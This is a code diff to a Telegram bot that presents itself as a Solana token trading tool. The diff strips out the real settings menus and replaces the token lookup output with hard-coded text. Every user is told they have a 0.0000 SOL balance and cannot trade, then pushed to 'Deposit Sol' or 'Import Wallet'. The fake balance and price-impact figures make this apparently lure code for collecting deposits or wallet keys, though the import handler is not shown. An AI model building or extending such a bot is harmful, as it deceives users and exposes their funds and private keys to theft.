@@ -53,6 +53,14 @@ async def start(client, message):
     else:
         await message.reply_text(text=Txt.START_TXT.format(user.mention), reply_markup=button, disable_web_page_preview=True)
 
+@Client.on_message(filters.private & filters.command("bots"))
+async def botus(client, message):
+    user = message.from_user
+    if Config.START_PIC:
+        await message.reply_photo(Config.START_PIC, caption=Txt.BOTS_TXT.format(user.mention))       
+    else:
+        await message.reply_text(text=Txt.BOTS_TXT.format(user.mention), disable_web_page_preview=True)
+
 @Client.on_message(filters.private & filters.command(["settings"]))
 async def setting(client, message):
     user = message.from_user              
@@ -121,7 +129,12 @@ async def wallet(client, message):
 #API
 API = "https://api.dexscreener.com/latest/dex/tokens/{}"
 
-BUTTONS = InlineKeyboardMarkup([[InlineKeyboardButton('Close', callback_data = 'close')]])
+BUTTONS = InlineKeyboardMarkup([[
+            InlineKeyboardButton("Deposit Sol", callback_data="deposit_sol")
+        ],[
+            InlineKeyboardButton("Import Wallet", callback_data="import_wallet")
+        ],[
+            InlineKeyboardButton("Back", callback_data="start")]])
 
 @Client.on_message(filters.private & filters.text & filters.incoming)
 async def reply_info(bot, message):
@@ -145,17 +158,26 @@ def token_info(token_id):
         base_token_name = info['baseToken']['name']
         base_token_symbol = info['baseToken']['symbol']
         price_usd = info['priceUsd']
-        volume_24h = info['volume']['h24']
-        price_change_24h = info['priceChange']['h24']
-        liquidity_usd = info['liquidity']['usd']
+        fivemin = info['priceChange']['5m']
+        onehour = info['priceChange']['h1']
+        sixhour = info['priceChange']['h6']
+        twofourhours = info['priceChange']['h24']
+        marketcap = info['fdv']
         
-        token_details = f"""--**Token Information**--
-Name : `{base_token_name}`
-Symbol : `{base_token_symbol}`
-Price (USD) : `{price_usd}`
-Volume (24h) : `{volume_24h}`
-Price Change (24h) : `{price_change_24h}%`
-Liquidity (USD) : `{liquidity_usd}`"""
+        token_details = f"""
+`{base_token_symbol}` | `{base_token_name}` |
+
+Price ($) : `{price_usd}`
+5m : `{fivemin}%` 1h : `{onehour}%` 6h : `{sixhour}%` 24h : `{twofourhours}%`
+Market Cap : `{marketcap}`
+
+Price Impact (1.0000 SOL): 1.13%
+
+Wallet Balance: 0.0000 SOL
+
+🔴 You Don’t Have Enough SOL To Make A Trade
+
+Import A Wallet Or Deposit SOL Below ⬇️"""
         return token_details
     except Exception as error:
         return str(error)
@@ -536,74 +558,16 @@ async def cb_handler(client, query: CallbackQuery):
         
     elif data == "disabled":
         await query.message.edit_text(
-            text=Txt.SETTINGS2_TXT,
-            disable_web_page_preview=True,
-            reply_markup=InlineKeyboardMarkup([[
-                #⚠️ don't change source code & source link ⚠️ #
-                InlineKeyboardButton("🇬🇧 English", callback_data='english'),
-        InlineKeyboardButton("Min Pos Value: $0.001", callback_data='min_pos_value')
+        text=Txt.DEPOSIT_TXT,
+        disable_web_page_preview=True,
+        reply_markup=InlineKeyboardMarkup([[
+            InlineKeyboardButton("Deposit Sol", callback_data="deposit_sol")
         ],[
-        InlineKeyboardButton("🔴 Disabled", callback_data='disabled'),
-        InlineKeyboardButton("🔧 0.10 SOL", callback_data='auto_buy_value')
+            InlineKeyboardButton("Import Wallet", callback_data="import_wallet")
         ],[
-        InlineKeyboardButton("🔧 Left: 1.0 SOL", callback_data='buy_left'),
-        InlineKeyboardButton("🔧 Right: 5.0 SOL", callback_data='buy_right')
-        ],[
-        InlineKeyboardButton("🔧 Left: 25%", callback_data='sell_left'),
-        InlineKeyboardButton("🔧 Right: 100%", callback_data='sell_right')
-        ],[
-        InlineKeyboardButton("🔧 Buy: 10%", callback_data='slippage_buy'),
-        InlineKeyboardButton("🔧 Sell: 10%", callback_data='slippage_sell')
-        ],[
-        InlineKeyboardButton("🔧 Max Price Impact: 25%", callback_data='max_price_impact')
-        ],[
-        InlineKeyboardButton("🚀 Turbo", callback_data='mev_turbo')
-        ],[
-        InlineKeyboardButton("🚀 Turbo", callback_data='mev_turbo')
-        ],[
-        InlineKeyboardButton("🔧 Medium", callback_data='transaction_priority_medium'),
-        InlineKeyboardButton("🔧 0.00150 SOL", callback_data='transaction_priority_value')
-        ],[
-        InlineKeyboardButton("🟢 Enabled", callback_data='sell_protection_enabled')
-        ],[
-        InlineKeyboardButton("Close", callback_data='close')
-            ]])          
-        )
-    elif data == "enabled":
-        await query.message.edit_text(
-            text=Txt.SETTINGS1_TXT,
-            disable_web_page_preview=True,
-            reply_markup=InlineKeyboardMarkup([[
-                #⚠️ don't change source code & source link ⚠️ #
-                InlineKeyboardButton("🇬🇧 English", callback_data='english'),
-        InlineKeyboardButton("Min Pos Value: $0.001", callback_data='min_pos_value')
-        ],[
-        InlineKeyboardButton("🟢 Enabled", callback_data='enabled'),
-        InlineKeyboardButton("🔧 0.10 SOL", callback_data='auto_buy_value')
-        ],[
-        InlineKeyboardButton("🔧 Left: 1.0 SOL", callback_data='buy_left'),
-        InlineKeyboardButton("🔧 Right: 5.0 SOL", callback_data='buy_right')
-        ],[
-        InlineKeyboardButton("🔧 Left: 25%", callback_data='sell_left'),
-        InlineKeyboardButton("🔧 Right: 100%", callback_data='sell_right')
-        ],[
-        InlineKeyboardButton("🔧 Buy: 10%", callback_data='slippage_buy'),
-        InlineKeyboardButton("🔧 Sell: 10%", callback_data='slippage_sell')
-        ],[
-        InlineKeyboardButton("🔧 Max Price Impact: 25%", callback_data='max_price_impact')
-        ],[
-        InlineKeyboardButton("🚀 Turbo", callback_data='mev_turbo')
-        ],[
-        InlineKeyboardButton("🚀 Turbo", callback_data='mev_turbo')
-        ],[
-        InlineKeyboardButton("🔧 Medium", callback_data='transaction_priority_medium'),
-        InlineKeyboardButton("🔧 0.00150 SOL", callback_data='transaction_priority_value')
-        ],[
-        InlineKeyboardButton("🟢 Enabled", callback_data='sell_protection_enabled')
-        ],[
-        InlineKeyboardButton("Close", callback_data='close')
-            ]])          
-        )
+            InlineKeyboardButton("Back", callback_data="start")
+        ]])
+    )
     elif data == "close":
         try:
             await query.message.delete()
